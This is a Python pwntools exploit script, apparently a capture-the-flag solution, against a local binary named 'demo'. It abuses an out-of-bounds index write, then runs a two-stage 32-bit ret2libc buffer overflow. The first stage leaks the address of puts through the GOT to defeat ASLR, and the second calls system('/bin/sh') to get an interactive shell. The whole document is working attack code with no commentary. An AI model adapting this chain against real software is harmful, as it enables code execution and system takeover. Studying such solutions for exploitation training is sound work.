from pwn import *

s = process('./demo')
libc = ELF('libc-2.31.so')
binary = ELF('demo')

s.sendlineafter(b'Chose:\n', b'2')
s.sendlineafter(b'What index you want to change:\n', b'4294967212')
s.sendlineafter(b'Input the charracter:\n', b'\x80')

payload = b'A' * 44 + p32(binary.plt['puts']) + p32(binary.symbols['main']) + p32(binary.got['puts'])
s.sendline(b'Change charracter at index ' + payload)

s.sendlineafter(b'Chose:\n', b'4')
s.recvline()

libc.address = int.from_bytes(s.recv(4).strip(), byteorder='little', signed=False) - libc.symbols['puts']

s.sendlineafter(b'Chose:\n', b'2')
s.sendlineafter(b'What index you want to change:\n', b'0')
s.sendlineafter(b'Input the charracter:\n', b'W')

payload = b'A' * 44 + p32(libc.symbols['system']) + p32(libc.symbols['exit']) + p32(next(libc.search(b'/bin/sh')))
s.sendline(b'Change charracter at index ' + payload)

s.sendlineafter(b'Chose:\n', b'4')
s.recvline()
s.interactive()
